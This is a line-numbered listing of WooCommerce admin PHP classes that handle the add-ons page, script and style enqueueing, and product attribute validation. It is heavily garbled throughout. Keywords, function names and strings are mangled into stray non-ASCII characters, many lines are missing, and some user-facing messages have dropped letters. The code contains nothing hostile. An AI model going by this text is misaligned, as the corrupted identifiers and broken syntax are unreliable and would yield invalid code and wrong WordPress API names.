138 <?
php
 
’dfÜ—ch
; ?>

139 </
£Ëù
>

140 </
p
>

141 <?
php


145 <
p
>

146 <
šput
 
id
="<?ph°echØesc_©ŒĞ$this->g‘_f›ld_idĞ$key ) ); ?>" 
Çme
="<?ph°echØesc_©ŒĞ$this->g‘_f›ld_ÇmeĞ$key ) ); ?>" 
ty³
="checkbox" 
v®ue
="1" <?
php
 
	`checked
Ğ
$v®ue
, 1 ); ?> />

147 <
Ïb–
 ="<?ph°echØ$this->g‘_f›ld_idĞ$key ); ?>"><?
php
 
echo
 
$£‰šg
['label']; ?></label>

148 </
p
>

149 <?
php


153 
	}
}

	@includes/admin/class-wc-admin-addons.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Addons' ) ) :

18 şas 
	cWC_Admš_AddÚs
 {

23 
public
 
funùiÚ
 
	$ouut
() {

25 
$v›w
 = 
	`is£t
Ğ
$_GET
['v›w'] ) ? 
	`§n™ize_‹xt_f›ld
( $_GET['view'] ) : '';

27 iàĞ
çl£
 ==ğĞ
$addÚs
 = 
	`g‘_Œªs›Á
Ğ'woocomm”û_addÚs_html_' . 
$v›w
 ) ) ) {

29 
$¿w_addÚs
 = 
	`wp_»mÙe_g‘
Ğ'h‰p://www.woÙhemes.com/´oduù-ÿ‹gÜy/woocomm”û-ex‹nsiÚs/' . 
$v›w
 . '?Üd”byõİuÏr™y', 
	`¬¿y
(

34 iàĞ! 
	`is_wp_”rÜ
Ğ
$¿w_addÚs
 ) ) {

36 
$¿w_addÚs
 = 
	`wp_»mÙe_»Œ›ve_body
( $raw_addons );

39 
$dom
 = 
Ãw
 
	`DOMDocum’t
();

40 
	`libxml_u£_š‹º®_”rÜs
(
Œue
);

41 
$dom
->
	`lßdHTML
Ğ
$¿w_addÚs
 );

43 
$addÚs
 = '';

44 
$x·th
 = 
Ãw
 
	`DOMXP©h
Ğ
$dom
 );

45 
$gs
 = 
$x·th
->
	`qu”y
('//ul[@class="products"]');

46 
	`fÜ—ch
 ( 
$gs
 
as
 
$g
 ) {

47 
$addÚs
 = 
$g
->
owÃrDocum’t
->
	`§veXML
( $tag );

51 iàĞ
$addÚs
 )

52 
	`£t_Œªs›Á
Ğ'woocomm”û_addÚs_html_' . 
$v›w
, 
	`wp_k£s_po¡
Ğ
$addÚs
 ), 60*60*24*7 );

56 
	`šşude_Úû
( 'views/html-admin-page-addons.php' );

58 
	}
}

60 
	g’dif
;

62  
Ãw
 
WC_Admš_AddÚs
();

	@includes/admin/class-wc-admin-assets.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Assets' ) ) :

18 şas 
	cWC_Admš_As£ts
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'admš_’queue_süts', 
	`¬¿y
Ğ
$this
, 'admin_styles' ) );

25 
	`add_aùiÚ
Ğ'admš_’queue_süts', 
	`¬¿y
Ğ
$this
, 'admin_scripts' ) );

26 
	`add_aùiÚ
Ğ'admš_h—d', 
	`¬¿y
Ğ
$this
, 'product_taxonomy_styles' ) );

32 
public
 
funùiÚ
 
	$admš_¡yËs
() {

33 
glob®
 
$wp_süts
;

36 
	`wp_’queue_¡yË
Ğ'woocomm”û_admš_m’u_¡yËs', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/css/m’u.css', 
	`¬¿y
(), 
WC_VERSION
 );

38 
$sü“n
 = 
	`g‘_cu¼’t_sü“n
();

40 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`wc_g‘_sü“n_ids
() ) ) {

42 
$jqu”y_v”siÚ
 = 
	`is£t
Ğ
$wp_süts
->
»gi¡”ed
['jqu”y-ui-cÜe']->
v”
 ) ? $wp_scripts->registered['jquery-ui-core']->ver : '1.9.2';

45 
	`wp_’queue_¡yË
Ğ'woocomm”û_admš_¡yËs', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/css/admš.css', 
	`¬¿y
(), 
WC_VERSION
 );

46 
	`wp_’queue_¡yË
Ğ'jqu”y-ui-¡yË', '//ajax.googË­is.com/ajax/libs/jqu”yui/' . 
$jqu”y_v”siÚ
 . '/themes/smoÙhÃss/jqu”y-ui.css', 
	`¬¿y
(), 
WC_VERSION
 );

47 
	`wp_’queue_¡yË
( 'wp-color-picker' );

50 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`¬¿y
( 'dashboard' ) ) ) {

51 
	`wp_’queue_¡yË
Ğ'woocomm”û_admš_dashbßrd_¡yËs', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/css/dashbßrd.css', 
	`¬¿y
(), 
WC_VERSION
 );

54 
	`do_aùiÚ
( 'woocommerce_admin_css' );

55 
	}
}

61 
public
 
funùiÚ
 
	$admš_süts
() {

62 
glob®
 
$wp_qu”y
, 
$po¡
;

64 
$sü“n
 = 
	`g‘_cu¼’t_sü“n
();

65 
$wc_sü“n_id
 = 
	`§n™ize_t™Ë
Ğ
	`__
( 'WooCommerce', 'woocommerce' ) );

66 
$suffix
 = 
	`defšed
Ğ'SCRIPT_DEBUG' ) && 
SCRIPT_DEBUG
 ? '' : '.min';

69 
	`wp_»gi¡”_süt
Ğ'woocomm”û_admš', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/woocomm”û_admš' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-blockui', 'jqu”y-ui-sÜbË', 'jqu”y-ui-widg‘', 'jqu”y-ui-cÜe', 'jqu”y-tt' ), 
WC_VERSION
 );

71 
	`wp_»gi¡”_süt
Ğ'jqu”y-blockui', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/jqu”y-blockui/jqu”y.blockUI' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), '2.66', 
Œue
 );

73 
	`wp_»gi¡”_süt
Ğ'jqu”y-tt', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/jqu”y-tt/jqu”y.tT' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

75 
	`wp_»gi¡”_süt
Ğ'accouÁšg', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/accouÁšg' . 
$suffix
 . '.js', 
	`¬¿y
( 'jquery' ), '0.3.2' );

77 
	`wp_»gi¡”_süt
Ğ'round', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/round' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
 );

79 
	`wp_»gi¡”_süt
Ğ'woocomm”û_admš_m‘a_boxes', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/m‘a-boxes' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-ui-d©•ick”', 'jqu”y-ui-sÜbË', 'accouÁšg', 'round' ), 
WC_VERSION
 );

81 
	`wp_»gi¡”_süt
Ğ'woocomm”û_admš_m‘a_boxes_v¬ŸtiÚs', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/m‘a-boxes-v¬ŸtiÚs' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-ui-sÜbË' ), 
WC_VERSION
 );

83 
	`wp_»gi¡”_süt
Ğ'ajax-cho£n', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/cho£n/ajax-cho£n.jqu”y' . 
$suffix
 . '.js', 
	`¬¿y
('jqu”y', 'cho£n'), 
WC_VERSION
 );

85 
	`wp_»gi¡”_süt
Ğ'cho£n', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/cho£n/cho£n.jqu”y' . 
$suffix
 . '.js', 
	`¬¿y
('jqu”y'), 
WC_VERSION
 );

88 
$·¿ms
 = 
	`¬¿y
(

89 'mÚ_decim®_pošt' => 
	`g‘_İtiÚ
( 'woocommerce_price_decimal_sep' )

92 
	`wp_loÿlize_süt
Ğ'accouÁšg', 'accouÁšg_·¿ms', 
$·¿ms
 );

95 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`wc_g‘_sü“n_ids
() ) ) {

97 
	`wp_’queue_süt
( 'woocommerce_admin' );

98 
	`wp_’queue_süt
( 'iris' );

99 
	`wp_’queue_süt
( 'ajax-chosen' );

100 
	`wp_’queue_süt
( 'chosen' );

101 
	`wp_’queue_süt
( 'jquery-ui-sortable' );

102 
	`wp_’queue_süt
( 'jquery-ui-autocomplete' );

104 
$loÿË
 = 
	`loÿËcÚv
();

105 
$decim®
 = 
	`is£t
Ğ
$loÿË
['decimal_point'] ) ? $locale['decimal_point'] : '.';

107 
$·¿ms
 = 
	`¬¿y
(

108 'i18n_decim®_”rÜ' => 
	`¥rštf
Ğ
	`__
Ğ'PËa£ƒÁ” iÀdecim® (%sèfÜm© w™houˆthou§nd s•¬©Üs.', 'woocomm”û' ), 
$decim®
 ),

109 'i18n_mÚ_decim®_”rÜ' => 
	`¥rštf
Ğ
	`__
Ğ'PËa£ƒÁ” iÀmÚ‘¬y decim® (%sèfÜm© w™houˆthou§nd s•¬©Ü ªd cu¼’cy symbŞs.', 'woocomm”û' ), 
	`g‘_İtiÚ
( 'woocommerce_price_decimal_sep' ) ),

110 'decim®_pošt' => 
$decim®
,

111 'mÚ_decim®_pošt' => 
	`g‘_İtiÚ
( 'woocommerce_price_decimal_sep' )

114 
	`wp_loÿlize_süt
Ğ'woocomm”û_admš', 'woocomm”û_admš', 
$·¿ms
 );

118 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`¬¿y
( 'edit-product_cat' ) ) )

119 
	`wp_’queue_medŸ
();

122 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`¬¿y
( 'edit-product' ) ) )

123 
	`wp_’queue_süt
Ğ'woocomm”û_quick-ed™', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/quick-ed™' . 
$suffix
 . '.js', 
	`¬¿y
('jqu”y'), 
WC_VERSION
 );

126 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`¬¿y
( 'shop_coupon', 'shop_order', 'product', 'edit-shop_coupon', 'edit-shop_order', 'edit-product' ) ) ) {

128 
	`wp_’queue_süt
( 'woocommerce_admin_meta_boxes' );

129 
	`wp_’queue_süt
( 'jquery-ui-datepicker' );

130 
	`wp_’queue_medŸ
();

131 
	`wp_’queue_süt
( 'ajax-chosen' );

132 
	`wp_’queue_süt
( 'chosen' );

133 
	`wp_’queue_süt
( 'plupload-all' );

135 
$·¿ms
 = 
	`¬¿y
(

136 '»move_™em_nÙiû' => 
	`__
( 'Are you sure you wanto„emovehe selected items? If you have…reviously„educedhis item\'s stock, orhis order was submitted by‡ customer, you will‚eedo manually„estorehe item\'s stock.', 'woocommerce' ),

137 'i18n_£Ëù_™ems' => 
	`__
( 'Please select some items.', 'woocommerce' ),

138 '»move_™em_m‘a' => 
	`__
( 'Removehis item meta?', 'woocommerce' ),

139 '»move_©Œibu‹' => 
	`__
( 'Removehis‡ttribute?', 'woocommerce' ),

140 'Çme_Ïb–' => 
	`__
( 'Name', 'woocommerce' ),

141 '»move_Ïb–' => 
	`__
( 'Remove', 'woocommerce' ),

142 'şick_to_toggË' => 
	`__
( 'Clickooggle', 'woocommerce' ),

143 'v®ues_Ïb–' => 
	`__
( 'Value(s)', 'woocommerce' ),

144 '‹xt_©Œibu‹_t' => 
	`__
( 'Enter someext, or some‡ttributes by…ipe (|) separating values.', 'woocommerce' ),

145 'visibË_Ïb–' => 
	`__
( 'Visible onhe…roduct…age', 'woocommerce' ),

146 'u£d_fÜ_v¬ŸtiÚs_Ïb–' => 
	`__
( 'Used for variations', 'woocommerce' ),

147 'Ãw_©Œibu‹_´om±' => 
	`__
( 'Enter‡‚ame forhe‚ew‡ttributeerm:', 'woocommerce' ),

148 'ÿlc_tÙ®s' => 
	`__
( 'Calculateotals based on order items, discounts,‡nd shipping?', 'woocommerce' ),

149 'ÿlc_lše_xes' => 
	`__
( 'Calculate†ineaxes? This will calculateaxes based onhe customers country. If‚o billing/shipping is set it will usehe store base country.', 'woocommerce' ),

150 'cİy_blšg' => 
	`__
( 'Copy billing informationo shipping information? This will„emove‡ny currentlyƒntered shipping information.', 'woocommerce' ),

151 'lßd_blšg' => 
	`__
( 'Loadhe customer\'s billing information? This will„emove‡ny currentlyƒntered billing information.', 'woocommerce' ),

152 'lßd_shpšg' => 
	`__
( 'Loadhe customer\'s shipping information? This will„emove‡ny currentlyƒntered shipping information.', 'woocommerce' ),

153 'ã©u»d_Ïb–' => 
	`__
( 'Featured', 'woocommerce' ),

154 '´iûs_šşude_x' => 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
('woocommerce_prices_include_tax') ),

155 'round_©_subtÙ®' => 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
( 'woocommerce_tax_round_at_subtotal' ) ),

156 'no_cu¡om”_£Ëùed' => 
	`__
( 'No customer selected', 'woocommerce' ),

157 '¶ugš_u¾' => 
	`WC
()->
	`¶ugš_u¾
(),

158 'ajax_u¾' => 
	`admš_u¾
('admin-ajax.php'),

159 'Üd”_™em_nÚû' => 
	`wp_ü—‹_nÚû
("order-item"),

160 'add_©Œibu‹_nÚû' => 
	`wp_ü—‹_nÚû
("add-attribute"),

161 '§ve_©Œibu‹s_nÚû' => 
	`wp_ü—‹_nÚû
("save-attributes"),

162 'ÿlc_tÙ®s_nÚû' => 
	`wp_ü—‹_nÚû
("calc-totals"),

163 'g‘_cu¡om”_d‘as_nÚû' => 
	`wp_ü—‹_nÚû
("get-customer-details"),

164 '£¬ch_´oduùs_nÚû' => 
	`wp_ü—‹_nÚû
("search-products"),

165 'g¿Á_acûss_nÚû' => 
	`wp_ü—‹_nÚû
("grant-access"),

166 '»voke_acûss_nÚû' => 
	`wp_ü—‹_nÚû
("revoke-access"),

167 'add_Üd”_nÙe_nÚû' => 
	`wp_ü—‹_nÚû
("add-order-note"),

168 'd–‘e_Üd”_nÙe_nÚû' => 
	`wp_ü—‹_nÚû
("delete-order-note"),

169 'ÿËnd¬_image' => 
	`WC
()->
	`¶ugš_u¾
().'/assets/images/calendar.png',

170 'po¡_id' => 
	`is£t
Ğ
$po¡
->
ID
 ) ? $post->ID : '',

171 'ba£_couÁry' => 
	`WC
()->
couÁr›s
->
	`g‘_ba£_couÁry
(),

172 'cu¼’cy_fÜm©_num_decim®s' => 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ),

173 'cu¼’cy_fÜm©_symbŞ' => 
	`g‘_woocomm”û_cu¼’cy_symbŞ
(),

174 'cu¼’cy_fÜm©_decim®_£p' => 
	`esc_©Œ
Ğ
	`¡r¦ashes
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_decimal_sep' ) ) ),

175 'cu¼’cy_fÜm©_thou§nd_£p' => 
	`esc_©Œ
Ğ
	`¡r¦ashes
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_thousand_sep' ) ) ),

176 'cu¼’cy_fÜm©' => 
	`esc_©Œ
Ğ
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'%1$s', '%2$s' ),‡¼ayĞ'%s', '%v' ), 
	`g‘_woocomm”û_´iû_fÜm©
() ) ),

177 'roundšg_´ecisiÚ' => 
WC_ROUNDING_PRECISION
,

178 'x_roundšg_mode' => 
WC_TAX_ROUNDING_MODE
,

179 '´oduù_ty³s' => 
	`¬¿y_m­
Ğ'§n™ize_t™Ë', 
	`g‘_‹rms
Ğ'´oduù_ty³', 
	`¬¿y
Ğ'hide_em±y' => 
çl£
, 'fields' => 'names' ) ) ),

180 'deçuÉ_©Œibu‹_visib™y' => 
	`­¶y_f‹rs
Ğ'deçuÉ_©Œibu‹_visib™y', 
çl£
 ),

181 'deçuÉ_©Œibu‹_v¬ŸtiÚ' => 
	`­¶y_f‹rs
Ğ'deçuÉ_©Œibu‹_v¬ŸtiÚ', 
çl£
 ),

182 'i18n_dowÆßd_³rmissiÚ_ç' => 
	`__
( 'Could‚ot grant‡ccess -he user may‡lready have…ermission forhis file or billingƒmail is‚ot set. Ensurehe billingƒmail is set,‡ndhe order has been saved.', 'woocommerce' ),

183 'i18n_³rmissiÚ_»voke' => 
	`__
( 'Are you sure you wanto„evoke‡ccessohis download?', 'woocommerce' ),

186 
	`wp_loÿlize_süt
Ğ'woocomm”û_admš_m‘a_boxes', 'woocomm”û_admš_m‘a_boxes', 
$·¿ms
 );

190 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`¬¿y
( 'product', 'edit-product' ) ) ) {

192 
	`wp_’queue_süt
( 'woocommerce_admin_meta_boxes_variations' );

194 
$·¿ms
 = 
	`¬¿y
(

195 'po¡_id' => 
	`is£t
Ğ
$po¡
->
ID
 ) ? $post->ID : '',

196 '¶ugš_u¾' => 
	`WC
()->
	`¶ugš_u¾
(),

197 'ajax_u¾' => 
	`admš_u¾
('admin-ajax.php'),

198 'woocomm”û_¶aûhŞd”_img_¤c' => 
	`wc_¶aûhŞd”_img_¤c
(),

199 'add_v¬ŸtiÚ_nÚû' => 
	`wp_ü—‹_nÚû
("add-variation"),

200 'lšk_v¬ŸtiÚ_nÚû' => 
	`wp_ü—‹_nÚû
("link-variations"),

201 'd–‘e_v¬ŸtiÚ_nÚû' => 
	`wp_ü—‹_nÚû
("delete-variation"),

202 'd–‘e_v¬ŸtiÚs_nÚû' => 
	`wp_ü—‹_nÚû
("delete-variations"),

203 'i18n_lšk_®l_v¬ŸtiÚs' => 
	`esc_js
Ğ
	`__
( 'Are you sure you wanto†ink‡ll variations? This will create‡‚ew variation forƒach‡ndƒvery…ossible combination of variation‡ttributes (max 50…er„un).', 'woocommerce' ) ),

204 'i18n_’‹r_a_v®ue' => 
	`esc_js
Ğ
	`__
( 'Enter‡ value', 'woocommerce' ) ),

205 'i18n_’‹r_a_v®ue_fixed_Ü_³rûÁ' => 
	`esc_js
Ğ
	`__
( 'Enter‡ value (fixed or %)', 'woocommerce' ) ),

206 'i18n_d–‘e_®l_v¬ŸtiÚs' => 
	`esc_js
Ğ
	`__
( 'Are you sure you wanto delete‡ll variations? This cannot be undone.', 'woocommerce' ) ),

207 'i18n_Ï¡_w¬nšg' => 
	`esc_js
Ğ
	`__
( 'Last warning,‡re you sure?', 'woocommerce' ) ),

208 'i18n_choo£_image' => 
	`esc_js
Ğ
	`__
( 'Choose‡n image', 'woocommerce' ) ),

209 'i18n_£t_image' => 
	`esc_js
Ğ
	`__
( 'Set variation image', 'woocommerce' ) ),

210 'i18n_v¬ŸtiÚ_added' => 
	`esc_js
Ğ
	`__
( "variation‡dded", 'woocommerce' ) ),

211 'i18n_v¬ŸtiÚs_added' => 
	`esc_js
Ğ
	`__
( "variations‡dded", 'woocommerce' ) ),

212 'i18n_no_v¬ŸtiÚs_added' => 
	`esc_js
Ğ
	`__
( "No variations‡dded", 'woocommerce' ) ),

213 'i18n_»move_v¬ŸtiÚ' => 
	`esc_js
Ğ
	`__
( 'Are you sure you wanto„emovehis variation?', 'woocommerce' ) )

216 
	`wp_loÿlize_süt
Ğ'woocomm”û_admš_m‘a_boxes_v¬ŸtiÚs', 'woocomm”û_admš_m‘a_boxes_v¬ŸtiÚs', 
$·¿ms
 );

220 iàĞĞ
	`¡r¡r
Ğ
$sü“n
->
id
, 'ed™-·_' ) || ( ! 
	`em±y
Ğ
$_GET
['xÚomy'] ) && 
	`š_¬¿y
Ğ$_GET['xÚomy'], 
	`­¶y_f‹rs
Ğ'woocomm”û_sÜbË_xÚom›s', 
	`¬¿y
Ğ'´oduù_ÿt' ) ) ) ) ) && ! 
	`is£t
( $_GET['orderby'] ) ) {

222 
	`wp_»gi¡”_süt
Ğ'woocomm”û_‹rm_Üd”šg', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/‹rm-Üd”šg.js', 
	`¬¿y
('jqu”y-ui-sÜbË'), 
WC_VERSION
 );

223 
	`wp_’queue_süt
( 'woocommerce_term_ordering' );

225 
$xÚomy
 = 
	`is£t
Ğ
$_GET
['xÚomy'] ) ? 
	`wc_ş—n
( $_GET['taxonomy'] ) : '';

227 
$woocomm”û_‹rm_Üd”_·¿ms
 = 
	`¬¿y
(

228 'xÚomy' => 
$xÚomy


231 
	`wp_loÿlize_süt
Ğ'woocomm”û_‹rm_Üd”šg', 'woocomm”û_‹rm_Üd”šg_·¿ms', 
$woocomm”û_‹rm_Üd”_·¿ms
 );

235 iàĞ
	`cu¼’t_u£r_ÿn
('ed™_Ùh”s_·ges'è&& 
$sü“n
->
id
 =ğ'ed™-´oduù' && 
	`is£t
Ğ
$wp_qu”y
->
qu”y
['orderby'] ) && $wp_query->query['orderby'] == 'menu_orderitle' ) {

237 
	`wp_’queue_süt
Ğ'woocomm”û_´oduù_Üd”šg', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/´oduù-Üd”šg.js', 
	`¬¿y
('jqu”y-ui-sÜbË'), 
WC_VERSION
, 
Œue
 );

242 iàĞ
	`š_¬¿y
Ğ
$sü“n
->
id
, 
	`­¶y_f‹rs
Ğ'woocomm”û_»pÜts_sü“n_ids', 
	`¬¿y
Ğ
$wc_sü“n_id
 . '_page_wc-reports', 'dashboard' ) ) ) ) {

243 
	`wp_’queue_süt
Ğ'wc-»pÜts', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/»pÜts' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'jqu”y-ui-d©•ick”' ), 
WC_VERSION
 );

244 
	`wp_’queue_süt
Ğ'æÙ', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/jqu”y.æÙ' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
 );

245 
	`wp_’queue_süt
Ğ'æÙ-»size', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/jqu”y.æÙ.»size' . 
$suffix
 . '.js', 
	`¬¿y
('jqu”y', 'æÙ'), 
WC_VERSION
 );

246 
	`wp_’queue_süt
Ğ'æÙ-time', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/jqu”y.æÙ.time' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'æÙ' ), 
WC_VERSION
 );

247 
	`wp_’queue_süt
Ğ'æÙ-p›', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/jqu”y.æÙ.p›' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'æÙ' ), 
WC_VERSION
 );

248 
	`wp_’queue_süt
Ğ'æÙ-¡ack', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/admš/jqu”y.æÙ.¡ack' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y', 'æÙ' ), 
WC_VERSION
 );

252 iàĞ
	`is_¹l
() ) {

253 
	`wp_’queue_süt
Ğ'cho£n-¹l', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/cho£n/cho£n-¹l' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y' ), 
WC_VERSION
, 
Œue
 );

255 
	}
}

265 
public
 
funùiÚ
 
	$´oduù_xÚomy_¡yËs
() {

267 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) ) ;

269 <
¡yË
 
ty³
="text/css">

270 <?
php
 iàĞ
	`is£t
(
$_GET
['taxonomy']) && $_GET['taxonomy']=='product_cat' ) : ?>

271 .
icÚ32
-
po¡s
-
´oduù
 { 
background
-
pos™iÚ
: -243
px
 -5px !
impÜÁ
; }

272 <?
php
 
	`–£if
 ( 
	`is£t
(
$_GET
['taxonomy']) && $_GET['taxonomy']=='product_tag' ) : ?>

273 .
icÚ32
-
po¡s
-
´oduù
 { 
background
-
pos™iÚ
: -301
px
 -5px !
impÜÁ
; }

274 <?
php
 
’dif
; ?>

275 </
¡yË
>

276 <?
php


277 
	}
}

280 
	g’dif
;

282  
Ãw
 
WC_Admš_As£ts
();

	@includes/admin/class-wc-admin-attributes.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 iàĞ! 
şass_exi¡s
( 'WC_Admin_Attributes' ) ) :

20 şas 
	cWC_Admš_A‰ribu‹s
 {

28 
public
 
funùiÚ
 
	$ouut
() {

29 
glob®
 
$wpdb
, 
$woocomm”û
;

32 
$aùiÚ
 = '';

33 iàĞ! 
	`em±y
Ğ
$_POST
['add_new_attribute'] ) ) {

34 
$aùiÚ
 = 'add';

35 } 
	`–£if
 ( ! 
	`em±y
Ğ
$_POST
['§ve_©Œibu‹'] ) && !ƒm±yĞ
$_GET
['edit'] ) ) {

36 
$aùiÚ
 = 'edit';

37 } 
	`–£if
 ( ! 
	`em±y
Ğ
$_GET
['delete'] ) ) {

38 
$aùiÚ
 = 'delete';

42 iàĞ'add' ==ğ
$aùiÚ
 || 'edit' === $action ) {

45 iàĞ'add' ==ğ
$aùiÚ
 ) {

46 
	`check_admš_»ã»r
( 'woocommerce-add-new_attribute' );

48 iàĞ'ed™' ==ğ
$aùiÚ
 ) {

49 
$©Œibu‹_id
 = 
	`absšt
Ğ
$_GET
['edit'] );

50 
	`check_admš_»ã»r
Ğ'woocomm”û-§ve-©Œibu‹_' . 
$©Œibu‹_id
 );

54 
$©Œibu‹_Ïb–
 = ( 
	`is£t
Ğ
$_POST
['©Œibu‹_Ïb–'] ) ) ? (
¡ršg
è
	`¡r¦ashes
( $_POST['attribute_label'] ) : '';

55 
$©Œibu‹_Çme
 = ( 
	`is£t
Ğ
$_POST
['©Œibu‹_Çme'] ) ) ? 
	`wc_§n™ize_xÚomy_Çme
Ğ
	`¡r¦ashes
Ğ(
¡ršg
) $_POST['attribute_name'] ) ) : '';

56 
$©Œibu‹_ty³
 = ( 
	`is£t
Ğ
$_POST
['©Œibu‹_ty³'] ) ) ? (
¡ršg
è
	`¡r¦ashes
( $_POST['attribute_type'] ) : '';

57 
$©Œibu‹_Üd”by
 = ( 
	`is£t
Ğ
$_POST
['©Œibu‹_Üd”by'] ) ) ? (
¡ršg
è
	`¡r¦ashes
( $_POST['attribute_orderby'] ) : '';

60 iàĞ! 
$©Œibu‹_Ïb–
 ) {

61 
$©Œibu‹_Ïb–
 = 
	`ucfœ¡
Ğ
$©Œibu‹_Çme
 );

63 iàĞ! 
$©Œibu‹_Çme
 ) {

64 
$©Œibu‹_Çme
 = 
	`wc_§n™ize_xÚomy_Çme
Ğ
	`¡r¦ashes
Ğ
$©Œibu‹_Ïb–
 ) );

69 
$»£rved_‹rms
 = 
	`¬¿y
(

81 iàĞ! 
$©Œibu‹_Çme
 || ! 
$©Œibu‹_Ïb–
 || ! 
$©Œibu‹_ty³
 ) {

82 
$”rÜ
 = 
	`__
( 'Please,…rovide‡n‡ttribute‚ame, slug‡ndype.', 'woocommerce' );

83 } 
	`–£if
 ( 
	`¡¾’
Ğ
$©Œibu‹_Çme
 ) >= 28 ) {

84 
$”rÜ
 = 
	`¥rštf
Ğ
	`__
Ğ'Slug â€œ%sâ€ i toØlÚg (28 ch¬aù” max). ShÜ‹À™,…Ëa£.', 'woocomm”û' ), 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) );

85 } 
	`–£if
 ( 
	`š_¬¿y
Ğ
$©Œibu‹_Çme
, 
$»£rved_‹rms
 ) ) {

86 
$”rÜ
 = 
	`¥rštf
Ğ
	`__
Ğ'Slug â€œ%sâ€ i nÙ‡Îowed beÿu£ iˆi ¨»£rved”m. Chªg™,…Ëa£.', 'woocomm”û' ), 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) );

88 
$xÚomy_exi¡s
 = 
	`xÚomy_exi¡s
Ğ
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$©Œibu‹_Çme
 ) );

90 iàĞ'add' ==ğ
$aùiÚ
 && 
$xÚomy_exi¡s
 ) {

91 
$”rÜ
 = 
	`¥rštf
Ğ
	`__
Ğ'Slug â€œ%sâ€ i ®»ady iÀu£. Chªg™,…Ëa£.', 'woocomm”û' ), 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) );

93 iàĞ'ed™' ==ğ
$aùiÚ
 ) {

94 
$Şd_©Œibu‹_Çme
 = 
$wpdb
->
	`g‘_v¬
( "SELECT‡ttribute_name FROM {$wpdb->prefix}woocommerce_attribute_taxonomies WHERE‡ttribute_id = $attribute_id" );

95 iàĞ
$Şd_©Œibu‹_Çme
 !ğ
$©Œibu‹_Çme
 && 
	`wc_§n™ize_xÚomy_Çme
Ğ$Şd_©Œibu‹_Çmè!ğ$©Œibu‹_Çm&& 
$xÚomy_exi¡s
 ) {

96 
$”rÜ
 = 
	`¥rštf
Ğ
	`__
Ğ'Slug â€œ%sâ€ i ®»ady iÀu£. Chªg™,…Ëa£.', 'woocomm”û' ), 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) );

102 iàĞ! 
	`em±y
Ğ
$”rÜ
 ) ) {

103 
echo
 '<div id="woocomm”û_”rÜs" cÏss="”rÜ fade"><p>' . 
$”rÜ
 . '</p></div>';

107 iàĞ'add' ==ğ
$aùiÚ
 ) {

109 
$©Œibu‹
 = 
	`¬¿y
(

110 '©Œibu‹_Ïb–' => 
$©Œibu‹_Ïb–
,

111 '©Œibu‹_Çme' => 
$©Œibu‹_Çme
,

112 '©Œibu‹_ty³' => 
$©Œibu‹_ty³
,

